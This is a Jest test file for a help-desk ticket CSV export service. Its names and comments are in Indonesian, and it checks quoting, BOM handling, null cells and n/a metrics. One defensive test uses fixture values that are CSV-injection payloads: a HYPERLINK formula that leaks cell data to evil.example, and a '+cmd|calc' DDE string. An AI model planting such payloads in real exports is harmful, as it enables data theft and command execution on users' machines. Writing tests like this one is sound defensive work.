import { ExportService } from './export.service';
import { ReportingService } from './reporting.service';

describe('M4-3: ExportService (CSV)', () => {
  let exporter: ExportService;

  const reporting = {
    slaAtRisk: jest.fn(),
    overview: jest.fn(),
  } as unknown as ReportingService;

  const prisma = {
    ticket: { findMany: jest.fn().mockResolvedValue([]) },
    cSATSurvey: { findMany: jest.fn().mockResolvedValue([]) },
  };

  beforeEach(() => {
    jest.clearAllMocks();
    prisma.ticket.findMany.mockResolvedValue([]);
    prisma.cSATSurvey.findMany.mockResolvedValue([]);
    exporter = new ExportService(prisma as never, reporting);
  });

  it('menghasilkan header CSV yang benar untuk daftar tiket', async () => {
    const file = await exporter.ticketsCsv({});
    const [header] = file.content.split('\r\n');

    expect(header).toContain('"Kode"');
    expect(header).toContain('"Judul"');
    expect(header).toContain('"SLA Terlampaui"');
    expect(file.filename).toMatch(
      /^tickets-\d{4}-\d{2}-\d{2}-\d{4}-\d{2}-\d{2}\.csv$/,
    );
  });

  it('menyertakan BOM UTF-8 agar Excel membaca karakter non-ASCII dengan benar', async () => {
    const file = await exporter.ticketsCsv({});
    expect(file.content.charCodeAt(0)).toBe(0xfeff);
  });

  it('men escapes tanda kutip ganda sesuai RFC 4180', async () => {
    prisma.ticket.findMany.mockResolvedValue([
      {
        code: 'HD-0001',
        title: 'Printer "macet" parah',
        status: 'OPEN',
        priority: 'HIGH',
        category: { name: 'Hardware' },
        requester: { name: 'Budi', email: 'budi@x.com' },
        assignee: null,
        createdAt: new Date('2026-10-01T00:00:00.000Z'),
        resolvedAt: null,
        slaDueAt: null,
        slaBreachedAt: null,
        aiTriaged: true,
      },
    ]);

    const file = await exporter.ticketsCsv({});
    // Kutip di dalam nilai menjadi dua kutip
    expect(file.content).toContain('"Printer ""macet"" parah"');
  });

  it('mencegah CSV injection pada nilai yang diawali formula', async () => {
    prisma.ticket.findMany.mockResolvedValue([
      {
        code: 'HD-0002',
        // Penyerang mencoba menyuntik formula lewat judul tiket
        title: '=HYPERLINK("http://evil.example?d="&A1,"klik")',
        status: 'OPEN',
        priority: 'LOW',
        category: { name: 'Lainnya' },
        requester: { name: '+cmd|calc', email: 'x@y.com' },
        assignee: null,
        createdAt: new Date('2026-10-01T00:00:00.000Z'),
        resolvedAt: null,
        slaDueAt: null,
        slaBreachedAt: null,
        aiTriaged: false,
      },
    ]);

    const file = await exporter.ticketsCsv({});

    // Nilai berbahaya harus diawali tanda kutip tunggal agar jadi teks biasa.
    expect(file.content).toContain(`"'=HYPERLINK`);
    expect(file.content).toContain(`"'+cmd|calc"`);
    // Tidak boleh ada sel yang secara mentah diawali '=' atau '+'
    const dataLines = file.content.split('\r\n').slice(1);
    for (const line of dataLines) {
      expect(line).not.toMatch(/,"[=+@]/);
    }
  });

  it('ekspor sla-at-risk menandai tiket yang lewat batas', async () => {
    (reporting.slaAtRisk as jest.Mock).mockResolvedValue([
      {
        id: '1',
        code: 'HD-0003',
        title: 'Server mati',
        status: 'OPEN',
        priority: 'URGENT',
        slaDueAt: '2026-10-01T00:00:00.000Z',
        overdue: true,
        hoursRemaining: -5.5,
        assignee: null,
      },
    ]);

    const file = await exporter.slaAtRiskCsv();
    expect(file.content).toContain('"TERLAMBAT"');
    // Nilai negatif ikut dilindungi dari formula injection → "'-5.5"
    expect(file.content).toContain(`"'-5.5"`);
    expect(file.filename).toMatch(/^sla-at-risk-/);
  });

  it('menyimpan nilai null sebagai sel kosong, bukan teks "null"', async () => {
    (reporting.slaAtRisk as jest.Mock).mockResolvedValue([
      {
        id: '1',
        code: 'HD-0004',
        title: 'Belum di-assign',
        status: 'OPEN',
        priority: 'MEDIUM',
        slaDueAt: '2026-10-05T00:00:00.000Z',
        overdue: false,
        hoursRemaining: 12,
        assignee: null,
      },
    ]);

    const file = await exporter.slaAtRiskCsv();
    const line = file.content.replace(/^\uFEFF/, '').split('\r\n')[1];
    const cells = line.split('","');

    // Kolom terakhir (assignee) adalah sel kosong; karena pemisah adalah
    // '","', sel terakhir tertinggal sebagai '"' saja.
    expect(cells[cells.length - 1]).toBe('"');
    expect(line.endsWith('""')).toBe(true);
    expect(file.content).not.toContain('"null"');
  });

  it('ekspor overview menandai metrik tanpa data sebagai "n/a" bukan nol', async () => {
    (reporting.overview as jest.Mock).mockResolvedValue({
      range: {
        from: '2026-09-01T00:00:00.000Z',
        to: '2026-10-01T00:00:00.000Z',
      },
      totals: {
        all: 0,
        open: 0,
        inProgress: 0,
        waitingUser: 0,
        resolved: 0,
        closed: 0,
        unassigned: 0,
        highPriority: 0,
      },
      completed: 0,
      resolution: { mttrHours: null, mtfaHours: null },
      sla: { compliancePercent: null, breached: 0, breachRatePercent: 0 },
      csat: { average: null, totalResponses: 0, distribution: {} },
    });

    const file = await exporter.overviewCsv({});
    const rows = file.content
      .replace(/^\uFEFF/, '')
      .split('\r\n')
      .map((line) => line.split('","'));

    // Sel CSV selalu diapit kutip; ambil isinya tanpa kutip penutup.
    const metric = (name: string) => {
      const row = rows.find((r) => r[0].replace(/^"/, '') === name);
      return row?.[1]?.replace(/"$/, '');
    };

    expect(metric('MTTR (jam)')).toBe('n/a');
    expect(metric('CSAT rata-rata')).toBe('n/a');
    // Nilai nol yang sungguhan tetap ditulis sebagai "0", bukan jadi "n/a"
    expect(metric('Total tiket')).toBe('0');
  });
});
